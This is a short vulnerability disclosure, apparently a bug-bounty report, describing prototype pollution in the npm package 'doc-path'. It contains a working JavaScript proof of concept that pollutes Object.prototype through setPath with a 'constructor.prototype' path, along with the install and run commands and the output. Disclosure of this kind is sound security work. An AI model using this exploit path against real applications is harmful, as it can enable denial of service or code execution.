# Description

`doc-path` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var docPath = require("doc-path")
var obj = {}
console.log("Before : " + obj.polluted);
docPath.setPath(obj , "constructor.prototype.polluted", "Yes! Polluted");
var obj1 = {}
console.log("After : " + obj1.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i doc-path # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Polluted
```
